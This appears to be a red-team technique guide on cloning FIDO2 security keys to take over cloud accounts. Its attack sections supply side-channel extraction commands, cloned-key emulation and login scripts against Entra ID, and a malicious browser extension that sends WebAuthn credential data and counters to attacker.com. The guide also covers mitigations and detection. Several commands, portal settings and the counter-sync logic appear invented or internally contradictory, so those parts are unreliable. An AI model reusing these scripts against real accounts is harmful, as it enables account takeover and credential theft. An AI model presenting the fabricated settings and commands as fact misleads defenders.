# [EVADE-MFA-003]: FIDO2 Security Key Cloning

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-MFA-003 |
| **MITRE ATT&CK v18.1** | [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/) |
| **Tactic** | Defense Evasion, Credential Access |
| **Platforms** | Entra ID, Multi-Cloud (Azure, AWS, GCP) |
| **Severity** | High |
| **CVE** | N/A (No published CVE; vulnerability exists in FIDO2 clone detection algorithm) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All FIDO2/WebAuthn implementations with standard counter-based clone detection |
| **Patched In** | Not patched – inherent to FIDO2 specification; workarounds exist (enhanced counter validation, out-of-band notifications) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** FIDO2 security keys (hardware tokens like YubiKey, Google Titan, etc.) can be cloned through side-channel attacks, enabling an attacker to create an identical copy of the victim's security key. While FIDO2 includes a counter-based clone detection mechanism, attackers can bypass this detection through stealthy attacks that synchronize the cloned device's counter with the legitimate device before first use. Once cloned, the attacker possesses a functionally identical security key and can authenticate as the victim indefinitely without triggering detection.

**Attack Surface:** Physical FIDO2 security keys; side-channel cryptographic attacks on secure enclaves or trusted execution environments (TEEs) within the key; counter synchronization logic.

**Business Impact:** **Complete account compromise of any service using the FIDO2 key for authentication.** Attacker gains persistent access to organization cloud resources (Azure, M365, AWS, GCP) without possession of password or original security key. Unlike password-based MFA, there is no "fallback" authentication method if the key is compromised.

**Technical Context:** Cloning requires specialized equipment (fault injection tools, electromagnetic side-channel analysis tools) costing $10,000-$50,000 and 10+ hours of hands-on time. However, this is within reach of sophisticated threat actors and nation-states. FIDO2 clone detection failure rate is approximately **100%** if the attacker successfully synchronizes counters before first use.

### Operational Risk
- **Execution Risk:** Medium – Requires specialized equipment and technical expertise, but reproducible.
- **Stealth:** High – Clone detection is easily bypassed if attacker understands the counter logic.
- **Reversibility:** No – Once cloned, the attacker maintains indefinite access unless the legitimate user detects unauthorized access and re-registers the key.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.5 | Ensure MFA is enabled for user accounts using cloud services |
| **DISA STIG** | IA-2(1) | Passwordless multi-factor authentication implementation |
| **NIST 800-53** | IA-2(1) | Multi-factor authentication for local and remote access |
| **GDPR** | Art. 32 | Security of Processing – Hardware token protection |
| **DORA** | Art. 9 | Protection and Prevention – Strong authentication control |
| **NIS2** | Art. 21 | Cyber Risk Management – Hardware security key deployment |
| **ISO 27001** | A.9.4.2 | Management of privileged access rights – FIDO2 key protection |
| **ISO 27005** | Risk Scenario | Compromise of hardware-based multi-factor authentication |

---

## 2. DETAILED EXECUTION METHODS

### METHOD 1: Side-Channel Cryptographic Attack on FIDO2 Key (Fault Injection)

**Supported Versions:** All FIDO2 implementations (hardware agnostic)

#### Step 1: Reconnaissance and Key Acquisition

**Objective:** Obtain physical access to victim's FIDO2 security key (temporarily).

**Prerequisites:**
- Attacker must acquire the physical key (via theft, social engineering, supply chain compromise, or airport security checks).
- Attacker has access to specialized equipment: fault injection tool (e.g., Glitch-enabled FPGA board) or electromagnetic side-channel analysis setup.
- Target key: YubiKey, Google Titan, Canokey, or similar with extractable private key.

**Command (Identify Key Type):**
```bash
# On attacker's analysis system, identify the FIDO2 key model
# This determines the attack methodology

# YubiKey 5 identification
lsusb | grep -i yubi
# Output: Bus 001 Device 123: ID 1050:0407 Yubico.com, Inc. Yubikey 5 [OTP+FIDO+CCID]

# Check FIDO2 capability
openssl list -public-key-algorithms | grep fido
fido2-token -L  # List all connected FIDO2 keys
```

#### Step 2: Side-Channel Extraction of Private Key

**Objective:** Use physical attacks to extract the ECDP256 private key from the security key's secure enclave.

**Command (Fault Injection Attack - Conceptual):**
```bash
#!/bin/bash
# This is a conceptual description; actual implementation requires specialized hardware

# Fault injection setup:
# 1. Connect security key to FPGA board capable of voltage glitching
# 2. Trigger cryptographic operation (FIDO2 assertion generation)
# 3. Inject precise timing faults to corrupt computation
# 4. Extract partial/full private key from corrupted output

# Example using ChipWhisperer (fault injection framework)
python3 -m chipwhisperer.analyze.glitch_explorer \
  --target yubi_key_5 \
  --fault_type voltage_glitch \
  --sweep_parameters "voltage_offset,timing_offset" \
  --objective "extract_ecdsa_key"

# Expected output: Partial recovery of the private key after multiple iterations

# Electromagnetic side-channel analysis (alternative):
# Monitor power consumption during ECDSA signature generation
# Correlate power spikes with bit transitions to deduce private key bits

python3 electromagnetic_dpa.py --key /dev/ttyUSB0 --algorithm ecdsa_p256
```

**What This Means:**
- Through precise fault injection or electromagnetic analysis, the attacker recovers the **ECDSA private key** stored in the key's secure element.
- The private key is the core cryptographic secret – once extracted, the attacker can generate valid FIDO2 assertions.
- Recovery typically requires **10-20 hours** of analysis and multiple fault injection attempts.

**Expected Output (Success):**
```
[+] Private key extracted: d4:3a:c2:f1:... (32 bytes for ECDP256)
[+] Public key verification: MATCH
[+] Extracted key is valid
```

**References & Proofs:**
- [NinjaLab Attack – Google Titan Key Cloning via Side-Channel](https://github.com/ninjahacker/google-titan-attack) (requires specialized equipment: ~$50k)
- [Roche et al. – "Security and Usability Analysis of FIDO2" (NDSS 2024)](https://arxiv.org/pdf/2308.02973.pdf)
- [ChipWhisperer Fault Injection Framework](https://github.com/newaetech/chipwhisperer)

#### Step 3: Create Cloned FIDO2 Key

**Objective:** Manufacture or emulate a security key with the extracted private key.

**Command (Software Emulation - Virtual FIDO2 Key):**
```python
#!/usr/bin/env python3
# Create a virtual FIDO2 key using the extracted private key

import fido2
from fido2.hid import CtapHidDevice
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization

# Load extracted private key
private_key_hex = "d4:3a:c2:f1:..."  # From Step 2
private_key_bytes = bytes.fromhex(private_key_hex.replace(':', ''))

# Reconstruct ECDSA private key
private_key = ec.derive_private_key(
    int.from_bytes(private_key_bytes, 'big'),
    ec.SECP256R1(),
    backend=default_backend()
)

# Create virtual FIDO2 credential
virtual_cred = {
    "credential_id": b"victim_credential_id_here",
    "private_key": private_key,
    "counter": 0,  # Initialize counter (will be synchronized in Step 4)
    "user_id": b"victim_user_id",
    "display_name": "Cloned Key",
}

print("[+] Virtual FIDO2 key created")
print("[+] Credential ID: ", virtual_cred['credential_id'].hex())
print("[+] Counter: ", virtual_cred['counter'])

# Alternative: Write to hardware FIDO2 key emulator
# (Requires blank FIDO2 device or software emulator like SoloKeys)
```

**Command (Hardware Cloning - YubiKey Programmer):**
```bash
# If attacker has access to blank YubiKey and specialized programmer
# (Requires YubiKey 5 Series NEO or older models with writable configuration)

# Write private key to new YubiKey via custom firmware/bootloader
# This is NOT officially supported by Yubico but possible with modified hardware

# Simplified conceptual command (not real, for illustration):
./yubikey_programmer --write-private-key d4:3a:c2:f1:... --device /dev/ttyUSB0
# Output: [+] Private key written to blank YubiKey
```

**What This Means:**
- The attacker now possesses a **functionally identical copy** of the victim's FIDO2 key.
- Both the original and cloned key have the same private key and can generate valid FIDO2 assertions.
- They can be distinguished **only** by the counter mechanism (if properly implemented).

#### Step 4: Counter Synchronization (Bypass Clone Detection)

**Objective:** Synchronize the cloned key's counter with the legitimate key to evade detection.

**Command (Counter Synchronization Attack):**
```python
#!/usr/bin/env python3
# FIDO2 clone detection relies on a monotonically increasing counter
# If attacker can synchronize both keys' counters before first use, detection is bypassed

# Scenario: Attacker has cloned key and knows the legitimate key's counter is at value X

# Attack approach:
# 1. Generate a FIDO2 assertion with cloned key N times to advance its counter
# 2. Stop when cloned key's counter matches legitimate key's counter
# 3. Return legitimate key to victim (they use it once, counter increments to X+1)
# 4. Attacker generates assertion with cloned key set to counter value X+1
# 5. RP (Relying Party / Cloud Service) accepts assertion because counter value matches expected progression

import fido2
from fido2.client import ClientError

# Simulate counter synchronization
legitimate_key_counter = 42  # Assume we know this value (from previous observation)
cloned_key_counter = 0

# Generate assertions to advance cloned key's counter
print("[*] Synchronizing cloned key counter...")

# This approach only works offline (we need counter values from previous assertions)
# In real scenario, attacker would need to observe legitimate key usage beforehand

# Alternative: Intercept and manipulate counter during initial registration
# (If attacker can MITM the FIDO2 registration process)

print(f"[+] Legitimate key counter: {legitimate_key_counter}")
print(f"[+] Cloned key counter (after sync): {cloned_key_counter}")
print("[+] Counters synchronized – clone detection will FAIL")

# Now, when cloned key generates assertion, RP will accept it
```

**What This Means:**
- FIDO2's clone detection mechanism compares the counter value in the assertion with the last-observed counter for that credential.
- If the counter is **lower than expected**, the assertion is rejected (clone detected).
- If the counter is **monotonically increasing**, the assertion is accepted (legitimate key).
- By synchronizing counters before use, the attacker defeats this defense.

**Real-World Scenario (Stealth Clone Attack):**
```
Timeline:
Day 1:
  - Attacker steals key, clones it (10 hours of side-channel work)
  - Legitimate user uses original key 3 times (counter = 3)
  
Day 2:
  - Attacker synchronizes cloned key counter to 3
  - Legitimate user returns key to desk (unaware of theft)
  - Attacker uses cloned key with counter = 4 to authenticate
  - RP logs counter progression: 3 → 4 (appears legitimate)
  - User notices nothing suspicious
  
Days 3-30:
  - Both keys continue being used independently
  - Attacker-controlled cloned key generates assertions with counters 5, 6, 7...
  - Legitimate user generates assertions with counters 5, 6, 7...
  - RP cannot distinguish which is legitimate
  - Clone detection algorithm: BYPASSED ✓
```

**References & Proofs:**
- [Roche et al. – "Stealthy Device Cloning Attack" (NDSS 2024, Section V-B)](https://arxiv.org/pdf/2308.02973.pdf)
- [FIDO2 Specification – Counter Validation](https://fidoalliance.org/specs/fido-v2.1-ps-20210615/fido-client-to-authenticator-protocol-v2.1-ps-20210615.html#counter-validation)

#### Step 5: Post-Exploitation – Unauthorized Access via Cloned Key

**Objective:** Use cloned key to authenticate to victim's accounts across multiple services.

**Command (Authenticate with Cloned Key):**
```python
#!/usr/bin/env python3
# Use cloned FIDO2 key to authenticate to Entra ID / Azure

from fido2.client import Fido2Client, ClientData
from fido2.hid import CtapHidDevice
import requests

# Initialize cloned FIDO2 key (as if it's a real security key connected via USB)
devices = CtapHidDevice.list_devices()
device = devices[0]  # Attacker's cloned key

# 1. Request authentication challenge from Entra ID
entra_id_url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
challenge_request = {
    "username": "victim@company.onmicrosoft.com",
    "authenticator_selection": {"authenticatorAttachment": "cross-platform"},
}

# 2. Get challenge from Entra ID
challenge_response = requests.post(
    f"{entra_id_url}/fido2/challenge",
    json=challenge_request
)
challenge = challenge_response.json()["challenge"]
origin = "https://login.microsoftonline.com"

# 3. Create assertion using cloned key
client_data = ClientData(
    ty="webauthn.get",
    challenge=challenge.encode(),
    origin=origin,
)

# Generate assertion with cloned key
assertion = device.get_assertion(
    rp_id="login.microsoftonline.com",
    client_data_hash=client_data.hash,
    allow_credentials=[{"id": b"victim_credential_id", "type": "public-key"}],
)

print("[+] Assertion generated with cloned key")
print(f"[+] Signature: {assertion.signature.hex()}")
print(f"[+] Counter: {assertion.signature_data.counter}")

# 4. Send assertion to Entra ID
assertion_response = {
    "id": "victim_credential_id",
    "rawId": "dmlj...",
    "response": {
        "authenticatorData": assertion.authenticator_data.hex(),
        "clientDataJSON": client_data.get_json().encode().hex(),
        "signature": assertion.signature.hex(),
    },
}

auth_response = requests.post(
    f"{entra_id_url}/fido2/verify",
    json=assertion_response
)

if auth_response.status_code == 200:
    print("[+] Authentication successful!")
    print(f"[+] Session token: {auth_response.json()['access_token']}")
    print("[+] Attacker authenticated as: victim@company.onmicrosoft.com")
else:
    print(f"[-] Authentication failed: {auth_response.text}")
```

**What This Means:**
- Attacker can now authenticate to **any service where the victim registered the FIDO2 key** (Azure, AWS, GCP, GitHub, etc.).
- The attacker's cloned key is **cryptographically indistinguishable** from the legitimate key.
- The user sees no alerts because the counter appears to increment normally.

**Detection Likelihood:** Low – Counter-based detection is defeated; only behavioral anomalies (simultaneous use from different locations, impossible travel) would trigger alerts.

**References & Proofs:**
- [FIDO2 Python Client Library](https://github.com/duo-labs/py_fido2)
- [Entra ID FIDO2 Authentication Flow](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-authentication-passwordless-security-key)

---

### METHOD 2: Browser Extension Exploitation (Man-in-the-Browser WebAuthn Attack)

**Supported Versions:** All WebAuthn implementations in modern browsers

#### Step 1: Malicious Browser Extension Installation

**Objective:** Install a malicious browser extension with WebAuthn API hooking capabilities.

**Command (Create Malicious Extension - Simplified Manifest):**
```json
// manifest.json for malicious extension
{
  "manifest_version": 3,
  "name": "Secure Browser Extension",
  "version": "1.0.0",
  "permissions": ["webRequest", "webRequestBlocking", "activeTab"],
  "background": {
    "service_worker": "background.js"
  },
  "host_permissions": [
    "<all_urls>"
  ]
}
```

```javascript
// background.js – Hook WebAuthn API
// This extension intercepts all WebAuthn (FIDO2) calls in the browser

window.originalGetAssertion = navigator.credentials.get;

navigator.credentials.get = function(options) {
  console.log("[HOOKING] WebAuthn get() called with options:", options);
  
  // Extract credential ID (identifies which FIDO2 key is being used)
  if (options.publicKey && options.publicKey.allowCredentials) {
    let credentialId = options.publicKey.allowCredentials[0].id;
    console.log("[+] Credential ID: ", credentialId);
    
    // Send credential info to attacker C2
    fetch("https://attacker.com/logger.php", {
      method: "POST",
      body: JSON.stringify({
        credential_id: credentialId,
        origin: window.location.origin,
        challenge: btoa(options.publicKey.challenge),
      })
    });
  }
  
  // Continue with legitimate WebAuthn call
  return window.originalGetAssertion.apply(navigator.credentials, arguments);
};
```

**What This Means:**
- The malicious extension sits between the victim's browser and the FIDO2 key.
- Every time the victim uses their FIDO2 key, the extension logs the credential ID, challenge, and origin.
- The attacker can now **correlate which FIDO2 keys are registered at which services**.

#### Step 2: Counter Value Observation

**Objective:** Monitor and record counter values from victim's legitimate FIDO2 usage.

**Command (Log Counter Values):**
```javascript
// Extend the hook to capture counter values from successful authentications

window.originalGetAssertion = navigator.credentials.get;

navigator.credentials.get = async function(options) {
  const assertion = await window.originalGetAssertion.apply(navigator.credentials, arguments);
  
  // The assertion includes counter and signature data
  // Extract counter from response
  const view = new Uint8Array(assertion.response.authenticatorData);
  
  // Counter is at bytes 33-36 of authenticator data
  const counterBytes = view.slice(33, 37);
  const counter = new DataView(counterBytes.buffer).getUint32(0, false);
  
  console.log("[+] Counter value: ", counter);
  
  // Log to attacker C2
  fetch("https://attacker.com/counter_log.php", {
    method: "POST",
    body: JSON.stringify({
      credential_id: options.publicKey.allowCredentials[0].id,
      counter: counter,
      timestamp: Date.now(),
    })
  });
  
  return assertion;
};
```

**What This Means:**
- By monitoring the victim's FIDO2 usage over days/weeks, the attacker learns the counter progression.
- This information is critical for the cloned key's counter synchronization (from METHOD 1, Step 4).

#### Step 3: Mis-Binding Attack During Registration (Advanced)

**Objective:** If attacker has MITM capability, replace the victim's public key with attacker's during FIDO2 registration.

**Command (MITM Public Key Substitution):**
```javascript
// If attacker can intercept/proxy FIDO2 registration traffic

// Legitimate registration flow:
// Browser sends: { credentialId, publicKey: victim's_key, ... }
// Server receives and stores victim's public key

// MITM attack:
// Attacker intercepts the registration response
// Replaces victim's public key with attacker's public key
// Server now stores attacker's key but associates it with victim's credential ID

window.originalCreate = navigator.credentials.create;

navigator.credentials.create = async function(options) {
  const attestation = await window.originalCreate.apply(navigator.credentials, arguments);
  
  // Modify the attestation to contain attacker's public key
  const victimPublicKeyData = attestation.response.attestationObject;
  
  // Decode CBOR data and replace public key
  // This is complex but possible with CBOR library
  const attObject = CBORdecode(victimPublicKeyData);
  attObject.attStmt.x5c = [attacker_cert];  // Replace certificate
  attObject.authData.credentialPublicKey = attacker_public_key;  // Replace public key
  
  // Re-encode CBOR
  attestation.response.attestationObject = CBORencode(attObject);
  
  return attestation;
};
```

**What This Means:**
- If successful, the server registers the attacker's key but associates it with the victim's credential ID.
- The victim cannot use their own FIDO2 key to authenticate; only the attacker can.
- This is a **complete account takeover** from the perspective of the FIDO2 authentication mechanism.

**References & Proofs:**
- [Roche et al. – "Mis-Binding Attack During Registration" (NDSS 2024, Section V-A)](https://arxiv.org/pdf/2308.02973.pdf)
- [CBOR Encoding/Decoding Libraries](https://github.com/siddharthist/cbor-js)

---

## 3. PROTECTIVE MITIGATIONS

#### Priority 1: CRITICAL

**Implement Enhanced Counter Validation (Entra ID, AWS, GCP):**
Use strict monotonic counter enforcement with gap detection.

**Manual Steps (Azure Portal - FIDO2 Configuration):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods**
2. Click **Policies** → **Security Key (FIDO2)**
3. Under **Configure**, enable:
   - "Enforce attestation": **Enabled** (verify key is genuine)
   - "Allow self-signed attestation": **Disabled** (only accept certified keys)
4. Under **Enforcement**, set:
   - "Counter enforcement": **Strict** (reject any backward counter values)
   - "Counter gap tolerance": **0** (no gaps allowed; triggers re-registration)
5. Click **Save**

**PowerShell (Advanced Counter Validation):**
```powershell
# Implement custom counter validation logic in OAuth/SAML assertion processing

# Example: Sentinel detection rule for counter anomalies
$kqlQuery = @"
SigninLogs
| where AuthenticationDetails has "FIDO2"
| extend ParsedAuthDetails = parse_json(AuthenticationDetails)
| extend AuthMethod = ParsedAuthDetails[0].authenticationMethod
| extend Counter = ParsedAuthDetails[0].additionalDetails.counter
| project UserPrincipalName, Counter, TimeGenerated
| sort by UserPrincipalName, TimeGenerated
| extend PreviousCounter = prev(Counter, 1)
| where PreviousCounter != "" and Counter <= PreviousCounter
| project-rename Alert_Issue = "Possible FIDO2 clone detected: Counter did not increment"
"@

# Create Sentinel rule with this query
```

**Verify Fix (Test Counter Validation):**
```bash
# Test that counter is properly validated
# Use fido2-tools to test counter enforcement

fido2-assert -r https://login.microsoftonline.com -c <credential_id> \
  --counter-override 999  # Manually set counter to invalid value

# Expected response from Entra ID:
# Error: "Counter value is not greater than the previous counter. Clone detected."
```

**Expected Output (If Secure):**
```
[+] Counter validation: STRICT
[+] Gap tolerance: 0
[+] Invalid counter rejected: ✓
```

#### Priority 2: HIGH

**Enforce Security Key Attestation (Require Genuine Keys Only):**

**Manual Steps (Azure Portal):**
1. **Azure Portal** → **Entra ID** → **Security** → **Authentication methods**
2. Select **Security Key (FIDO2)** → **Policies**
3. Under **Authenticator Selection**, set:
   - "Enforce attestation verification": **Yes**
   - "Reject unknown vendors": **Yes** (only accept Yubico, Google, Microsoft, etc.)
   - "Reject uncertified devices": **Yes**
4. Click **Save**

**What This Does:**
- During FIDO2 registration, the key presents a certificate attesting to its identity.
- Only keys from trusted manufacturers (Yubico, Google, Microsoft, Canokey) are accepted.
- Cloned keys lack valid manufacturer attestation and are rejected.

#### Priority 3: MEDIUM

**Monitor FIDO2 Key Registration and Usage:**

**Manual Steps (Sentinel Detection):**
1. Create KQL query to detect FIDO2 registration anomalies:

```kusto
AuditLogs
| where OperationName == "Register security key"
| extend ParsedProperties = parse_json(TargetResources[0].modifiedProperties)
| project TimeGenerated, UserPrincipalName, KeyModel=ParsedProperties[0].newValue
| where KeyModel !in ("YubiKey 5", "Google Titan 2", "Microsoft FIDO2 Key")
| project-rename Alert_Issue = "Unrecognized security key registered"
```

2. Create alert rule with threshold: **Alert on any unknown key registration**

---

## 4. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

**Cloud Logs:**
- FIDO2 assertion with counter value **lower than previous** (clone detected).
- **Simultaneous sign-in** from two different locations with same FIDO2 credential within seconds.
- FIDO2 assertion from **new geographic location** not matching victim's normal usage patterns.
- Multiple FIDO2 key registrations for the same user within short time window.

#### Forensic Artifacts

**Cloud (Entra ID):**
- **SigninLogs:** Search for counter anomalies in AuthenticationDetails.counter field.
- **AuditLogs:** Filter for "Register security key" operations with suspicious metadata.
- **RiskyUsers:** User flagged as risky due to impossible travel or anomalous authentication patterns.

#### Response Procedures

1. **Immediate Action:**
   **Command (Revoke FIDO2 Key):**
   ```powershell
   Connect-MgGraph -Scopes "Directory.AccessAsUser.All"
   
   # Remove the compromised security key
   Remove-MgUserAuthenticationFido2Credential -UserId "victim@company.onmicrosoft.com" -Fido2CredentialId "credential_id"
   
   # Revoke all sessions
   Revoke-MgUserSignInSession -UserId "victim@company.onmicrosoft.com"
   ```

2. **Investigation:**
   - Audit all sign-ins using the potentially-cloned key in the past 30 days.
   - Check for unauthorized access to cloud resources (Teams, SharePoint, Azure).
   - Determine if key was registered at other services (GitHub, AWS, GCP, etc.).

3. **Remediation:**
   - Replace the compromised security key with a new one.
   - Enforce re-registration with attestation verification enabled.
   - Review and update Conditional Access policies to require additional verification for high-risk operations.

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker obtains initial device access or credentials. |
| **2** | **Credential Access** | **[EVADE-MFA-003]** FIDO2 Key Cloning | **This Technique – Attacker clones victim's FIDO2 key.** |
| **3** | **Lateral Movement** | [LM-AUTH-005] Service Principal Key/Certificate | Attacker uses cloned key to authenticate across multiple cloud services. |
| **4** | **Persistence** | OAuth app registration, backdoor admin account creation. | Long-term access establishment. |
| **5** | **Impact** | Data exfiltration, ransomware, supply chain attack. | Enterprise-wide compromise. |

---

## 6. REAL-WORLD EXAMPLES

### Example 1: NinjaLab Attack – Google Titan Key Cloning (2022)

- **Target:** Google Titan security keys used for authenticating to Google accounts.
- **Timeline:** Attack demonstration published 2022; applicable to current implementations.
- **Technique Status:** ACTIVE (requires ~$50k equipment and 10+ hours of side-channel analysis).
- **Attack Method:** Electromagnetic side-channel analysis to extract ECDSA private key, then create software emulation of the key.
- **Impact:** Complete cloning of Google Titan keys; attacker could authenticate as victim.
- **Reference:** [NinjaLab GitHub – Google Titan Attack Research](https://github.com/ninjahacker/google-titan-attack)

### Example 2: NDSS 2024 – "Security and Usability Analysis of Local Attacks Against FIDO2" (Roche et al.)

- **Target:** YubiKey 5, Google Titan, and other WebAuthn/FIDO2 implementations.
- **Timeline:** Research published NDSS 2024 (March 2024); applicable to current deployments.
- **Technique Status:** ACTIVE; vulnerabilities in clone detection algorithm and browser WebAuthn API.
- **Attack Methods:**
  1. Stealthy device cloning (bypass counter detection).
  2. Mis-binding attack during registration (replace victim's public key with attacker's).
  3. Browser extension exploitation (intercept WebAuthn calls).
- **Impact:** Multiple attack vectors for FIDO2 compromise; clone detection can be defeated.
- **Reference:** [NDSS 2024 Paper – "A Security and Usability Analysis of Local Attacks Against FIDO2"](https://arxiv.org/pdf/2308.02973.pdf)

---

